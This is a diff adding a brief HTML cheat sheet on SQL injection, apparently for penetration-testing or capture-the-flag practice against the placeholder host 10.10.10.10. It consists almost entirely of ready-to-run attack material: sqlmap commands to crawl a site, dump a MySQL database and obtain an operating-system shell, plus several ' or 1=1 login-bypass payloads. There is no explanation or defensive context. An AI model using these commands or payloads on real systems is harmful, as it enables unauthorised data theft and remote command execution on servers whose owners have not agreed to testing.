@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Sql-Injection</title>
+</head><body><br/>
+<span style="font-size: 11pt"># sqlmap crawl sqlmap -u http://10.10.10.10 --crawl=1 <br/>
+# sqlmap dump database sqlmap -u http://10.10.10.10 --dbms=mysql --dump # sqlmap shell sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell &nbsp;<br/>
+<br/>
+<br/>
+</span><span style="font-size: 13pt"><br/>
+' or 1=1 LIMIT 1 -- <br/>
+' or 1=1 LIMIT 1 -- - <br/>
+' or 1=1 LIMIT 1# <br/>
+'or 1# ' or 1=1 -- ' or 1=1 -- - &nbsp;<br/>
+<br/>
+<br/>
+</span><br/>
+<br/>
+<br/>
+<br/>
+</body></html>
